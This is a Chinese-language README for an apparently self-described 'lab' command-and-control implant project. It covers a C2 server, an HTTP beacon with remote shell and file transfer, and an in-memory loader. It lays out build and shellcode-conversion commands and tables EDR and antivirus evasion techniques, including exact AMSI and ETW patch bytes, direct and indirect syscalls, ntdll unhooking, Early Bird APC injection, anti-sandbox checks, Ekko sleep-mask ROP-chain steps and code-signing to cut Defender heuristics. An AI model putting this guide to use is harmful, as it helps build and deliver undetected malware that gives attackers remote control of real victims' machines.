# lab-c2 — 远控(C2) + 免杀 靶场工程

靶场自用：一台 C2 控制器 + 一个 HTTP 信标 + 一个带内存加载的载体(loader)。
全部按"占位/hash 化/无字符串"的方式写，方便直接丢进隔离 VM 迭代对抗。

## 目录

```
lab-c2/
  c2_server.py          控制器: 会话注册 / 任务队列 / 结果回收 / 交互台
  implant/
    beacon.cpp          HTTP 信标: 心跳 / 拉任务 / 回传 / shell / 上下行文件
    loader.cpp          载体: 反沙箱+反调试 -> 解密 -> 早鸟 APC 注入
    syscall.hpp         直接&间接系统调用 + API哈希 + AMSI/ETW patch + ntdll 反 hook
    ekko.hpp            休眠混淆(sleep mask) + RC4
    payload.h           (生成物) 加密后的 shellcode + key
  tools/enc.py          RC4 加密 shellcode -> payload.h
  tools/selftest.py     无编译器环境自检: RC4 向量 / 往返 / payload.h / 服务端导入
  build.bat             x64 构建脚本
```

## 原理 (为什么这样分层)

1. **信标/载荷分离**。网络协议(pull 模型)与执行载荷解耦：信标只负责"打字机"，
   真正干活的 shellcode/PE 由 loader 在内存里落地。这样改协议不用改载荷，
   改载荷不用改协议。
2. **静态签名在"数据"上，动态检测在"调用"上**。免杀要分两层做：
   - 静态层：没有明文字符串、没有可疑导入表、payload 全程密文；
   - 动态层：页保护改动/内存分配走直接系统调用（不经过被 EDR 挂钩的 ntdll 桩），
     用户态钩子被还原，AMSI/ETW 被抹掉。
3. **信标不落地**。用 Donut / sRDI 把 beacon.exe 转成位置无关 shellcode，
   再由 loader 解密后直接在内存里跑，磁盘上不存在该 PE 文件。

## 步骤

### 0. 准备

```powershell
pip install aiohttp
# 构建需要 x64 Native Tools Command Prompt for VS 2022 (cl.exe / link.exe)
```

### 1. 起 C2

```powershell
python c2_server.py --port 8080
```

交互台命令：`list` / `use N` / `exec whoami` / `dl C:\Windows\win.ini` /
`ul 本地文件 C:\目标路径` / `sleep 30` / `kill`。

### 2. 编译信标

```bat
build.bat
```

### 3. 信标 -> shellcode

```bat
donut.exe -f 1 -a 2 -o build\beacon.bin build\beacon.exe
python tools\enc.py build\beacon.bin      :: 生成 implant\payload.h
build.bat                                  :: 带上 payload 重编 loader.exe
```

### 4. 验证

```powershell
python tools\selftest.py     # 无编译器自检: RC4 向量 / 加解密往返 / payload.h / 服务端导入
python tools\smoketest.py    # 端到端: 注册 -> 下发任务 -> 回传结果 -> UA 指纹校验
```

两者当前实测输出：

```
1) RC4 已知测试向量    RC4('Key','Plaintext') == BBF316E8D940AF0AD3   [ok]
2) enc.py 加解密往返   密文 != 明文 / 解密还原一致(sha256)            [ok]
3) 生成 payload.h      g_shellcode[]/g_scLen/g_key/g_keyLen          [ok]
4) c2_server.py 导入   aiohttp 已安装 / UA 与 beacon.cpp 一致         [ok]

1) 信标注册            首次心跳 {'tasks': []}                        [ok]
2) 任务下发            [{'id':1,'type':'shell','a':'whoami','b':''}] [ok]
3) 结果回传            {'ok': True}                                  [ok]
4) 指纹校验            错误 UA -> HTTP 404                           [ok]
```

> `implant/payload.h` 目前是自检生成的占位载荷（4096 字节随机数据）。
> 真正投递前必须用 `python tools\enc.py build\beacon.bin` 重新生成。

还要在隔离 VM 上做的两件事：
- **静态**：`MpCmdRun.exe -Scan -ScanType 3 -File build\loader.exe`，记录检出名。
- **动态**：Procmon 过滤 `Process Create` / `Load Image`，Process Explorer 看
  内存页保护(RW->RX 跳变)与线程起始地址是否落在非模块内存。
- **触发点**：`PatchETW` 抹掉 `EtwEventWrite`，`PatchAMSI` 抹掉 `AmsiScanBuffer`，
  两者只影响当前进程，重启进程即恢复。

## 免杀技术清单（本项目实现/给出模板）

| 层 | 技术 | 位置 |
|---|---|---|
| 静态 | 无明文字符串，全部 FNV-1a 哈希解析导出 | `syscall.hpp` |
| 静态 | API 走 PEB->Ldr 手工遍历，不用 GetProcAddress 字符串 | `syscall.hpp` |
| 静态 | payload RC4-128 密文内嵌，运行时原地解密 | `tools/enc.py` + `loader.cpp` |
| 静态 | `/MERGE:.rdata=.text`、`/GS-`、剥离调试信息 | `build.bat` |
| 动态 | 直接系统调用（Hell's Gate 取 SSN，运行时造桩） | `syscall.hpp` |
| 动态 | 间接系统调用（跳 ntdll 内 `0F 05 C3` 指令，调用栈看起来合法） | `syscall.hpp` |
| 动态 | 从 `\KnownDlls\ntdll.dll` 重映射，覆盖 .text 反 un-hook | `syscall.hpp` |
| 动态 | AMSI: `AmsiScanBuffer` -> `B8 57 00 07 80 C3` | `syscall.hpp` |
| 动态 | ETW: `EtwEventWrite` -> `33 C0 C3` | `syscall.hpp` |
| 动态 | Early Bird APC 注入挂起进程，隐蔽于远程线程创建 | `loader.cpp` |
| 动态 | Moduleless 自注入（NtCreateSection + NtMapViewOfSection，无文件落地） | `loader.cpp` |
| 动态 | 内存休眠混淆，加密窗口内扫描器看不到 payload | `ekko.hpp` |
| 环境 | CPU/内存/开机时长/沙箱DLL/鼠标/主机名 七项门槛 | `loader.cpp` |
| 环境 | PEB.BeingDebugged + 远程调试器 + 硬件断点 Dr0-DR3 | `loader.cpp` |

关于"连自身代码一起隐藏"：`ekko.hpp` 的 `SleepMask` 只加密数据区。
要连信标自身镜像一起加密，必须用 Ekko 的 ROP 链方案：`RtlCaptureContext` 捕获现场，
把线程栈伪造成一串 ntdll 函数地址（`RtlCreateTimerQueue` / `NtWaitForSingleObject` /
`NtContinue` …），再 `NtContinue` 让线程"跌进" ntdll 代码里执行等待，
期间 beaocn 镜像全密文。**关键约束**：加密期间执行的指令和栈上的返回地址都必须位于
ntdll，所以顺序必须是"先加密 -> 再跳 ntdll -> 定时器解密 -> 再 NtContinue 回来"。
写错了就是加密自己的返回地址 -> 线程崩溃。建议先跑 `SleepMask` 打稳，再上 ROP 链。

## 注意

- 现代 EDR 会校验 `syscall` 指令的**返回地址是否在 ntdll 内**：直接系统调用(`syscall` 在我们自己造的内存里)
  在高版本 Defender for Endpoint / CrowdStrike 上会被标记，优先用间接模式。
- 用户态 patch（AMSI/ETW/unhook）只解决用户态挂钩，内核回调(ObRegisterCallbacks、
  PsSetCreateProcessNotifyRoutineEx)和 ETW-TI 看不见。
- 签名：`signtool sign /fd SHA256 /f cert.pfx /p pass /tr http://timestamp.digicert.com /td SHA256 loader.exe`，
  有效签名能显著降低 SmartScreen/Defender 的启发式权重。
